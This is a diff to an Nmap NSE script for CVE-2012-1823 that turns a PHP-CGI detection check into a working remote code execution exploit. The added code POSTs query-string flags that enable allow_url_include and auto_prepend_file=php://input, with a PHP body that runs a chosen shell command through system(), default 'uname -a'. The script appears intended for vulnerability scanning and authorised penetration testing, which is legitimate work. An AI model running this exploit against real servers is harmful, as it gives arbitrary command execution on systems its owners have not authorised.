@@ -10,9 +10,9 @@ Detects PHP-CGI installations that are vulnerable to CVE-2012-1823, This critica
 The script works by appending "?-s" to the uri to make vulnerable php-cgi handlers return colour syntax highlighted source. We use the pattern "<span style=.*>&lt;?" to detect
 vulnerable installations.
 
-TODO:
--Improve detection mechanism ( Execute certain payload and look for it in the response to confirm exploitability)
--Add exploitation script
+CHANGELOG:
+- Added new detection mechanism by trying to perform a "echo" command
+- Added exploitation script that allows you to define your command (default: uname -a). 
 ]]
 
 ---
@@ -45,9 +45,10 @@ TODO:
 -- |_      http://ompldr.org/vZGxxaQ
 --
 -- @args http-vuln-cve2012-1823.uri URI. Default: /index.php
+-- @args http-vuln-cve2012-1823.cmd CMD. Default: uname -a
 ---
 
-author = "Paulino Calderon <calderon@websec.mx>"
+author = "Paulino Calderon <calderon@websec.mx>, Paul AMAR <aos.paul@gmail.com>"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 categories = {"exploit","vuln","intrusive"}
 
@@ -55,7 +56,8 @@ categories = {"exploit","vuln","intrusive"}
 portrule = shortport.http
 
 action = function(host, port)
-  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/index.php"
+  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"
+  local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or "uname -a"
 
   local vuln = {
        title = 'PHP-CGI Remote code execution and source code disclosure',
@@ -80,20 +82,21 @@ code execution.]],
      }
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
 
-  local reg_session = http.get(host, port, uri)
-  if reg_session and reg_session.status == 200 then
-    if string.match(reg_session.body, "<span style=.*>&lt;?") then
-      stdnse.print_debug(1, "Pattern exists on file! We can't determine if this page is vulnerable. Try with a different URI.")
+  stdnse.print_debug(2, "Trying detection using echo command")
+  local detection_session = http.post(host, port, uri.."?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", { no_cache = true }, nil, "<?php system('echo NmapCVEIdentification');die(); ?>")
+  if detection_session and detection_session.status == 200 then
+    if string.match(detection_session.body, "NmapCVEIdentification") then
+      stdnse.print_debug(1, "The website seems vulnerable to CVE-2012-1823.")
+    else
       return
     end
   end
 
-  local open_session = http.get(host, port, uri.."?-s")
-  if open_session and open_session.status == 200 then
-     if string.match(open_session.body, "<span style=.*>&lt;?") then
-        vuln.state = vulns.STATE.EXPLOIT
-        vuln.extra_info=string.format("Proof of Concept:%s\n%s", uri.."?-s", open_session.body)
-        return vuln_report:make_output(vuln)
-     end
+  stdnse.print_debug(2, "Trying Command... " .. cmd)
+  local exploitation_session = http.post(host, port, uri.."?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", { no_cache = true }, nil, "<?php system('"..cmd.."');die(); ?>")
+  if exploitation_session and exploitation_session.status == 200 then
+    stdnse.print_debug(1, "Ouput of the command " .. cmd .. " : \n"..exploitation_session.body)
+    vuln.state = vulns.STATE.EXPLOIT
+    return vuln_report:make_output(exploitation_session.body)
   end
 end
